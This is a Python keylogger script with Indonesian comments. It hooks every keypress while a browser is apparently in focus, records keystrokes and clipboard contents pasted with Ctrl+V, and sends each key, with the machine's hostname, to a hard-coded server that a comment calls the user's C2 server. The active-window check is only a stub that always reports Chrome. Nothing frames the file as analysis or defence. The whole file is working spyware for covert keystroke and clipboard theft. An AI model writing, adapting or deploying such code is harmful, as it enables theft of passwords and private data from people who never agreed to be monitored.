import socket
import pyperclip
import keyboard
import requests



def act_win_pn():
    # Simulasi mendapatkan jendela aktif
    return (1234, "chrome.exe", "Google Chrome")


def browserList(text):
    # Periksa apakah proses berada dalam daftar target browser
    target_browsers = ["chrome.exe", "brave.exe", "firefox.exe", "safari.exe", "msedge.exe"]
    return text.lower() in target_browsers


def GetTextFromClipboard():
    return pyperclip.paste()


def save_log(log, text, caption):
    key_log = ""  # Reset log setelah mengirim

    payload = {
        'gid': "sType",
        'pid': "gType",
        'pcname': socket.gethostname(),
        'processname': text,
        'windowname': caption,
        'data': log,
    }

    host2 = "http://192.168.0.85:1224"  # Ganti dengan C2 server Anda
    headers = {
        'Content-Type': 'application/json',
    }

    try:
        response = requests.post(host2 + "/api/clip", json=payload, headers=headers)
        print("Response:", response.status_code, response.text)
    except requests.exceptions.RequestException as e:
        print("Error:", e)


def OnKeyboardEvent(event):
    (pid, text, caption) = act_win_pn()
    if browserList(text):
        key = event.name

        if keyboard.is_pressed('ctrl'):
            key = f"<{event.name}>"
        elif key == 'enter':
            key = "\n"
        elif len(key) == 1:
            key = key
        else:
            key = f"<{event.name}>"

        if keyboard.is_pressed('ctrl') and event.name.lower() == 'v':
            key += GetTextFromClipboard()

        save_log(key, text, "extension")

    return True


keyboard.on_press(OnKeyboardEvent)
keyboard.wait()
